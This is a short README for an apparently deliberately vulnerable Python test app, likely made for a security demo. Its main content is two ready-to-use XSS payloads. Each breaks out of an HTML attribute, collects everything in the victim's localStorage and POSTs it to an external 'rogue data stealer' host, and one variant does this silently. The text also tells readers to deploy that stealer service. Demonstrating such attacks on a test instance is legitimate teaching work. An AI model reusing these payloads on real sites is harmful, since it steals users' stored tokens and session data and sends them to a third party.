# whathestack2024-vuln-python
Python vulnerable instance for testing


If you are running the quiet version you must deploy and run the rogue_data_stealer branch.
Make sure you replace the URL for the rogue data stealer below with the one you are hosting.

Loud Attack command - can be used with running rogue data stealer, or even without, since it renders the result on alert.
"><script>(function(){var d={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d[k]=localStorage.getItem(k);}alert('Local Storage Data: '+JSON.stringify(d));fetch('https://wts2024-data-stealer.onrender.com/receive-data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});})();</script>


Quiet Attack command must be run with active rogue data stealer. 
"><script>(function(){var d={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d[k]=localStorage.getItem(k);}fetch('https://wts2024-data-stealer.onrender.com/receive-data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});})();</script>